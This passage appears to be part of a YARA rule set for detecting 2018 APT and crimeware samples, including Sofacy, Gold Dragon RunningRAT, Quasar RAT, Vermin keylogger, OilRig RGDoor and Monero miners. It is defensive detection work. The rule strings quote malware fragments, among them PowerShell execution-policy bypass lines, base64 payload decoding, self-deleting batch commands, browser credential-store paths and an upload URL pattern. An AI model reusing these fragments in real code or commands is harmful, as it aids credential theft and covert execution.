      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii
      $s2 = "Server.exe" fullword ascii
      $s3 = "System.Windows.Forms.Form" fullword ascii
      $s4 = "Stub.Resources.resources" fullword ascii
      $s5 = "My.Computer" fullword ascii
      $s6 = "MyTemplate" fullword ascii
      $s7 = "Stub.My.Resources" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule Sofacy_Campaign_Mal_Feb18_cdnver_RID3324 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Detects Sofacy malware"
      author = "Florian Roth"
      reference = "https://twitter.com/ClearskySec/status/960924755355369472"
      date = "2018-02-07 14:35:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "cdnver.dll" fullword wide
      $x2 = { 25 73 0A 00 00 00 00 00 30 00 00 00 20 00 2D 00
              20 00 00 00 0A 00 00 00 25 00 73 00 00 00 00 00
              69 00 6D 00 61 00 67 00 65 00 2F 00 6A 00 70 00
              65 00 67 } 
      $s1 = "S7%s - %lu" fullword ascii
      $s2 = "SNFIRNW" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( pe.imphash ( ) == "01f3d0fe6fb9d9df24620e67afc143c7" or 1 of ( $x* ) or 2 of them )
} 

rule ME_Campaign_Malware_1_RID2EDA : APT DEMO EXE FILE MAL MIDDLE_EAST {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07 11:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == "618f76eaf4bd95c690d43e84d617efe9" )
} 

rule ME_Campaign_Malware_2_RID2EDB : APT DEMO EXE FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07 11:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "QuickAssist.exe" fullword wide
      $s2 = "<description>Microsoft Modern Sharing Solution</description>" fullword ascii
      $s3 = "GBEWCWA" fullword ascii
      $s4 = "name=\"QuickAssist\" " fullword ascii
      $s5 = "Cimzal" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "b06055e6cc2a804111ab6964df1ca4ae" or 4 of them )
} 

rule ME_Campaign_Malware_3_RID2EDC : APT DEMO FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07 11:32:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "objWShell.Run \"powershell.exe -ExecutionPolicy Bypass -File \"\"%appdata%\"\"\\sys.ps1\", 0 " fullword ascii
      $x2 = "objFile.WriteLine \"New-Item -Path \"\"$ENV:APPDATA\\Microsoft\\Templates\"\" -ItemType Directory -Force }\" " fullword ascii
      $x3 = "objFile.WriteLine \"$path = \"\"$ENV:APPDATA\\Microsoft\\Templates\\Report.doc\"\"\" " fullword ascii
      $s4 = "File=appData & \"\\sys.ps1\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x6553 and filesize < 400KB and 1 of them
} 

rule ME_Campaign_Malware_4_RID2EDD : APT DEMO EXE FILE MAL MIDDLE_EAST {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07 11:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and pe.imphash ( ) == "fb7da233a35ac523d6059fff543627ab"
} 

rule ME_Campaign_Malware_5_RID2EDE : APT DEMO EXE FILE MAL MIDDLE_EAST T1047 T1136 {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07 11:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1047, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "D:\\me\\do\\do\\obj\\" ascii
      $s2 = "Select * from Win32_ComputerSystem" fullword wide
      $s3 = "Get_Antivirus" fullword ascii
      $s4 = "{{\"id\":\"{0}\",\"user\":\"{1}\",\"path\":\"{2}\"}}" fullword wide
      $s5 = "update software online" fullword wide
      $s6 = "time.nist.gov" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and ( pe.imphash ( ) == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them ) ) or ( all of them )
} 

rule WScript_Shell_PowerShell_Combo_RID32E7 : ANOMALY DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07 14:25:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "ANOMALY, DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".CreateObject(\"WScript.Shell\")" ascii
      $p1 = "powershell.exe" fullword ascii
      $p2 = "-ExecutionPolicy Bypass" fullword ascii
      $p3 = "[System.Convert]::FromBase64String(" ascii
      $fp1 = "Copyright: Microsoft Corp." ascii
   condition: 
      filesize < 400KB and $s1 and 1 of ( $p* ) and not 1 of ( $fp* )
} 

rule GoldDragon_malware_Feb18_1_RID309F : APT DEMO EXE FILE {
   meta:
      description = "Detects malware from Gold Dragon report"
      author = "Florian Roth"
      reference = "https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/"
      date = "2018-02-03 12:47:41"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "168c2f7752511dfd263a83d5d08a90db" or pe.imphash ( ) == "0606858bdeb129de33a2b095d7806e74" or pe.imphash ( ) == "51d992f5b9e01533eb1356323ed1cb0f" or pe.imphash ( ) == "bb801224abd8562f9ee8fb261b75e32a" )
} 

rule GoldDragon_Aux_File_RID2E5E : APT DEMO T1136 {
   meta:
      description = "Detects export from Gold Dragon - February 2018"
      author = "Florian Roth"
      reference = "https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/"
      date = "2018-02-03 11:11:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/////////////////////regkeyenum////////////" ascii
   condition: 
      filesize < 500KB and 1 of them
} 

rule GoldDragon_RunningRAT_RID2F19 : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Detects Running RAT from Gold Dragon report"
      author = "Florian Roth"
      reference = "https://goo.gl/rW1yvZ"
      date = "2018-02-03 11:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "C:\\USERS\\WIN7_x64\\result.log" fullword wide
      $x2 = "rundll32.exe %s RunningRat" fullword ascii
      $x3 = "SystemRat.dll" fullword ascii
      $x4 = "rundll32.exe %s ExportFunction" fullword ascii
      $x5 = "rundll32.exe \"%s\" RunningRat" fullword ascii
      $x6 = "ixeorat.bin" fullword ascii
      $x7 = "C:\\USERS\\Public\\result.log" fullword ascii
      $a1 = "emanybtsohteg" fullword ascii
      $a2 = "tekcosesolc" fullword ascii
      $a3 = "emankcosteg" fullword ascii
      $a4 = "emantsohteg" fullword ascii
      $a5 = "tpokcostes" fullword ascii
      $a6 = "putratSASW" fullword ascii
      $s1 = "ParentDll.dll" fullword ascii
      $s2 = "MR - Already Existed" fullword ascii
      $s3 = "MR First Started, Registed OK!" fullword ascii
      $s4 = "RM-M : LoadResource OK!" fullword ascii
      $s5 = "D:\\result.log" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "c78ccc8f02286648c4373d3bf03efc43" or pe.exports ( "RunningRat" ) or 1 of ( $x* ) or 5 of ( $a* ) or 3 of ( $s* ) )
} 

rule GoldDragon_RunnignRAT_RID2F19 : APT DEMO EXE FILE T1057 T1082 T1085 T1136 {
   meta:
      description = "Detects Running RAT malware from Gold Dragon report"
      author = "Florian Roth"
      reference = "https://goo.gl/rW1yvZ"
      date = "2018-02-03 11:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1057, T1082, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd.exe /c systeminfo " fullword ascii
      $s2 = "ieproxy.dll" fullword ascii
      $s3 = "taskkill /f /im daumcleaner.exe" fullword ascii
      $s4 = "cmd.exe /c tasklist " fullword ascii
      $s5 = "rundll32.exe \"%s\" Run" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 5.2; rv:12.0) Gecko/20100101 Firefox/12.0" fullword ascii
      $s7 = "%s\\%s_%03d" fullword wide
      $s8 = "\\PI_001.dat" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 3 of them )
} 

rule Scarcruft_malware_Feb18_1_RID306B : APT DEMO EXE FILE G0067 T1136 {
   meta:
      description = "Detects Scarcruft malware - February 2018"
      author = "Florian Roth"
      reference = "https://twitter.com/craiu/status/959477129795731458"
      date = "2018-02-03 12:39:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0067, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "d:\\HighSchool\\version 13\\2ndBD\\T+M\\" ascii
      $x2 = "cmd.exe /C ping 0.1.1.2" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule TopHat_Malware_Jan18_2_RID2EFB : APT DEMO EXE FILE MAL T1050 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file e.exe"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix"
      date = "2018-01-29 11:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1050, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii
      $s2 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii
      $s3 = "LError loading dock zone from the stream. Expecting version %d, but found %d." fullword wide
      $s4 = "WINMGMTS:\\\\.\\ROOT\\CIMV2" fullword ascii
      $s5 = "UENCRYPTION" fullword ascii
      $s6 = "TEXPORTAPIS" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == "f98cebcae832abc3c46e6e296aecfc03" and 5 of them )
} 

rule TopHat_BAT_RID2A97 : APT DEMO T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file cgen.bat"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix"
      date = "2018-01-29 07:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "= New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"" ascii
      $s2 = "goto Start" fullword ascii
      $s3 = ":Start" fullword ascii
   condition: 
      filesize < 5KB and all of them
} 

rule Quasar_RAT_Jan18_1_RID2D35 : APT DEMO EXE FILE MAL T1047 T1136 {
   meta:
      description = "Detects Quasar RAT"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/"
      date = "2018-01-29 10:22:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "ping -n 20 localhost > nul" fullword wide
      $s2 = "HandleDownloadAndExecuteCommand" fullword ascii
      $s3 = "DownloadAndExecute" fullword ascii
      $s4 = "UploadAndExecute" fullword ascii
      $s5 = "ShellCommandResponse" fullword ascii
      $s6 = "Select * From Win32_ComputerSystem" fullword wide
      $s7 = "Process could not be started!" fullword wide
      $s8 = ".Core.RemoteShell" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and $a1 and 3 of them
} 

rule Vermin_Keylogger_Jan18_1_RID2FFB : APT DEMO EXE FILE T1056 T1082 T1136 {
   meta:
      description = "Detects Vermin Keylogger"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/"
      date = "2018-01-29 12:20:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1056, T1082, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "_keyloggerTaskDescription" fullword ascii
      $x2 = "_keyloggerTaskAuthor" fullword ascii
      $x3 = "GetKeyloggerLogsResponse" fullword ascii
      $x4 = "GetKeyloggerLogs" fullword ascii
      $x5 = "ExecuteUninstallKeyLoggerTask" fullword ascii
      $x6 = "ExecuteInstallKeyLoggerTask" fullword ascii
      $x7 = ":\\Projects\\Vermin\\KeyboardHookLib\\" ascii
      $x8 = ":\\Projects\\Vermin\\CryptoLib\\" ascii
      $s1 = "<RunHidden>k__BackingField" fullword ascii
      $s2 = "set_SystemInfos" fullword ascii
      $s3 = "set_RunHidden" fullword ascii
      $s4 = "set_RemotePath" fullword ascii
      $s5 = "ExecuteShellCommandTask" fullword ascii
      $s6 = "Client.exe" fullword wide
      $s7 = "xClient.Core.ReverseProxy.Packets" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 1 of ( $x* ) or 3 of them )
} 

rule Suckfly_Nidiran_Gen_1_RID2F1F : DEMO EXE FILE G0039 GEN MAL T1136 {
   meta:
      description = "Detects Suckfly Nidiran Trojan"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"
      date = "2018-01-28 11:43:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0039, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WriteProcessMemory fail at %d " fullword ascii
      $s2 = "CreateRemoteThread fail at %d " fullword ascii
      $s3 = "CreateRemoteThread Succ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
} 

rule Suckfly_Nidiran_Gen_2_RID2F20 : DEMO EXE FILE G0039 GEN MAL T1136 {
   meta:
      description = "Detects Suckfly Nidiran Trojan"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"
      date = "2018-01-28 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0039, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "WorkDll.dll" fullword ascii
      $x2 = "%userprofile%\\Security Center\\secriter.dll" fullword ascii
      $s1 = "DLL_PROCESS_ATTACH is called" fullword ascii
      $s2 = "Support Security Accounts Manager For Microsoft Windows.If this service is stopped, any services that depended on it will fail t" ascii
      $s3 = "before CreateRemoteThread" fullword ascii
      $s4 = "CreateRemoteThread Succ" fullword ascii
      $s5 = "Microsoft Security Accounts Manager" fullword ascii
      $s6 = "DoRunRemote" fullword ascii
      $s7 = "AutoRunFun" fullword ascii
      $s8 = "ServiceMain is called" fullword ascii
      $s9 = "DllRegisterServer is called" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 4 of them )
} 

rule Suckfly_Nidiran_Gen_3_RID2F21 : DEMO EXE FILE G0039 GEN MAL T1136 {
   meta:
      description = "Detects Suckfly Nidiran Trojan"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"
      date = "2018-01-28 11:44:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0039, GEN, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "RUN SHELLCODE FAIL" fullword ascii
      $x2 = "RUN PROCESS FAILD!" fullword ascii
      $x3 = "DOWNLOAD FILE FAILD" fullword ascii
      $x4 = "MODIFYCONFIG FAIL!" fullword ascii
      $x5 = "GetFileAttributes FILE FAILD" fullword ascii
      $x6 = "MODIFYCONFIG SUCC!" fullword ascii
      $s1 = "cmd.exe /c %s" fullword ascii
      $s2 = "error to create pipe!" fullword ascii
      $s3 = "%s\\%08x.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "ae0f4ebf7e8ce91d6548318a3cf82b7a" or 1 of ( $x* ) or 2 of them )
} 

rule OilRig_RGDoor_Gen1_RID2D8D : APT DEMO EXE FILE G0049 MIDDLE_EAST T1136 {
   meta:
      description = "Detects RGDoor backdoor used by OilRig group"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/"
      date = "2018-01-27 10:36:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $c1 = { 00 63 6D 64 24 00 00 00 00 72 00 00 00 00 00 00 00 75 70 6C 6F
              61 64 24 } 
      $c2 = { 63 61 6E 27 74 20 6F 70 65 6E 20 66 69 6C 65 3A 20 00 00 00 00
              00 00 00 64 6F 77 6E 6C 6F 61 64 24 } 
      $s1 = "MyNativeModule.dll" fullword ascii
      $s2 = "RGSESSIONID=" fullword ascii
      $s3 = "download$" fullword ascii
      $s4 = ".?AVCHelloWorld@@" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "47cb127aad6c7c9954058e61a2a6429a" or 1 of ( $c* ) or 2 of them )
} 

rule Elise_Jan18_1_RID2B74 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Elise malware samples - fake Norton Security NavShExt.dll"
      author = "Florian Roth"
      reference = "https://twitter.com/blu3_team/status/955971742329135105"
      date = "2018-01-24 09:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "NavShExt.dll" fullword wide
      $s2 = "Norton Security" fullword wide
      $a1 = "donotbotherme" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and ( pe.imphash ( ) == "e9478ee4ebf085d1f14f64ba96ef082f" or ( 1 of ( $s* ) and $a1 ) )
} 

rule MiniRAT_Gen_1_RID2B8E : DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "Detects Mini RAT malware"
      author = "Florian Roth"
      reference = "https://www.eff.org/deeplinks/2018/01/dark-caracal-good-news-and-bad-news"
      date = "2018-01-22 09:11:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Mini rat\\" ascii
      $x2 = "\\Projects\\ali\\Clever Components v7\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and 1 of them
} 

rule MAL_Envrial_Jan18_1_RID2D8C : DEMO EXE FILE MAL T1003 T1136 {
   meta:
      description = "Detects Encrial credential stealer malware"
      author = "Florian Roth"
      reference = "https://twitter.com/malwrhunterteam/status/953313514629853184"
      date = "2018-01-21 10:36:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/Evrial/master/domen" wide
      $a1 = "\\Opera Software\\Opera Stable\\Login Data" fullword wide
      $a2 = "\\Comodo\\Dragon\\User Data\\Default\\Login Data" fullword wide
      $a3 = "\\Google\\Chrome\\User Data\\Default\\Login Data" fullword wide
      $a4 = "\\Orbitum\\User Data\\Default\\Login Data" fullword wide
      $a5 = "\\Kometa\\User Data\\Default\\Login Data" fullword wide
      $s1 = "dlhosta.exe" fullword wide
      $s2 = "\\passwords.log" fullword wide
      $s3 = "{{ <>h__TransparentIdentifier1 = {0}, Password = {1} }}" fullword wide
      $s4 = "files/upload.php?user={0}&hwid={1}" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of them or 2 of ( $s* ) )
} 

rule MAL_unspecified_Jan18_1_RID2F4A : DEMO MAL T1136 {
   meta:
      description = "Detects unspecified malware sample"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-01-19 11:50:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii
      $s2 = "ping 192.0.2.2 -n 1 -w %d >nul 2>&1" fullword ascii
      $s3 = "[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]" fullword ascii
      $s4 = "start /b \"\" cmd /c del \"%%~f0\"&exit /b" fullword ascii
      $s5 = "[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]" fullword ascii
      $s6 = "%s\\%s.bat" fullword ascii
      $s7 = "DEL /s \"%s\" >nul 2>&1" fullword ascii
   condition: 
      filesize < 300KB and 2 of them
} 

rule Turla_Mal_Script_Jan18_1_RID2FD7 : DEMO G0010 RUSSIA SCRIPT T1064 T1136 {
   meta:
      description = "Detects Turla malicious script"
      author = "Florian Roth"
      reference = "https://ghostbin.com/paste/jsph7"
      date = "2018-01-19 12:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, G0010, RUSSIA, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".charCodeAt(i % " ascii
      $s2 = "{WScript.Quit();}" fullword ascii
      $s3 = ".charAt(i)) << 10) |" ascii
      $s4 = " = WScript.Arguments;var " ascii
      $s5 = "= \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";var i;" ascii
   condition: 
      filesize < 200KB and 2 of them
} 

rule NK_Miner_Malware_Jan18_1_RID2F9D : DEMO EXE FILE MAL NK T1136 {
   meta:
      description = "Detects Noth Korean Monero Miner mentioned in AlienVault report"
      author = "Florian Roth (original rule by Chris Doman)"
      reference = "https://goo.gl/PChE1z"
      date = "2018-01-09 12:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x0 = "c:\\users\\jawhar\\documents\\" ascii
      $x1 = "C:\\Users\\Jawhar\\documents\\" ascii
      $x2 = "The number of processors on this computer is {0}." fullword wide
      $x3 = { 00 00 1F 43 00 3A 00 5C 00 4E 00 65 00 77 00 44
              00 69 00 72 00 65 00 63 00 74 00 6F 00 72 00 79
              00 00 } 
      $x4 = "Le fichier Hello txt n'existe pas" fullword wide
      $x5 = "C:\\NewDirectory2\\info2" fullword wide
      $a = "82e999fb-a6e0-4094-aa1f-1a306069d1a5" ascii
      $b = "4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS" ascii
      $c = "barjuok.ryongnamsan.edu.kp" wide ascii
      $d = "C:\\SoftwaresInstall\\soft" wide ascii
      $e = "C:\\Windows\\Sys64\\intelservice.exe" wide ascii
      $f = "C:\\Windows\\Sys64\\updater.exe" wide ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them
} 

rule CoinMiner_Strings_RID2DDE : DEMO SUSP T1136 {
   meta:
      description = "Detects mining pool protocol string in Executable"
      author = "Florian Roth"
      reference = "https://minergate.com/faq/what-pool-address"
      date = "2018-01-04 10:50:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "stratum+tcp://" ascii
      $s2 = "\"normalHashing\": true," 
   condition: 
      filesize < 600KB and 1 of them
} 

rule CoinHive_Javascript_MoneroMiner_RID3366 : DEMO SUSP T1136 {
   meta:
      description = "Detects CoinHive - JavaScript Crypto Miner"
      author = "Florian Roth"
      reference = "https://coinhive.com/documentation/miner"
      date = "2018-01-04 14:46:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "CoinHive.CONFIG.REQUIRES_AUTH" fullword ascii
   condition: 
      filesize < 65KB and 1 of them
} 

rule XMRIG_Monero_Miner_RID2DC1 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects Monero mining software"
      author = "Florian Roth"
      reference = "https://github.com/xmrig/xmrig/releases"
      date = "2018-01-04 10:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "* COMMANDS:     'h' hashrate, 'p' pause, 'r' resume" fullword ascii
      $s2 = "--cpu-affinity       set process affinity to CPU core(s), mask 0x3 for cores 0 and 1" fullword ascii
      $s3 = "-p, --pass=PASSWORD      password for mining server" fullword ascii
      $s4 = "* VERSIONS:     XMRig/%s libuv/%s%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d or uint16 ( 0 ) == 0x457f ) and filesize < 3000KB and 1 of them
} 

rule XMRIG_Monero_Miner_Config_RID3076 : DEMO FILE SUSP T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files config.json, config.json"
      author = "Florian Roth"
      reference = "https://github.com/xmrig/xmrig/releases"
      date = "2018-01-04 12:40:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
